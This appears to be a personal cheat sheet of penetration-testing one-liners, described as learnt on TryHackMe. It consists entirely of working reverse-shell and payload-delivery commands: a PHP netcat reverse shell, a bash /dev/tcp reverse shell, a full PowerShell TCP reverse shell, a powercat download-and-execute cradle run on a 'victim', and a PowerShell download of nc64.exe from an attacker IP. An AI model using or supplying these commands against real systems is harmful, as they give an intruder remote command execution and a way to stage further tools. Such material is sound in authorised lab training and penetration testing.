---
description: Learnt on Tryhackme modules
---

# Nifty One Liners

**PHP Reverse netcat**

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

**Reverse Bash**

```
bash -i >& /dev/tcp/10.x.x.x/443 0>&1
```

Where 443 is the port

**Reverse Powershell (interactive powershell)**

```
powershell -nop -c "$c = New-Object System.Net.Sockets.TCPClient('IP',4444);
$st = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $st.Read($b, 0, $b.Length)) -ne 0){;
$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
$sb = (IEX $d 2>&1 | Out-String );
$sb2 = $sb + 'PS ' + (pwd).Path + '> ';
$sby = ([text.encoding]::ASCII).GetBytes($sb2);
$st.Write($sby,0,$sby.Length);$st.Flush()};$c.Close()"
```

**Reverse cmd using Powershell (powercat)**

Download[ powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) and start python3 -m http.server in the same directory (Kali IP 192.168.1.109). Next start a NC listener on port 4444 and run this command on the victim:

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 4444 -e cmd"
```

**Download file at Victim using PowerShell**

Here, 10.10.16.3 is Kali IP (attacker) and -outf specifies the directory where to store file.

```
powershell -c iwr http://10.10.16.3/nc64.exe -outf \Users\Administrator\Desktop\nc64.exe
```
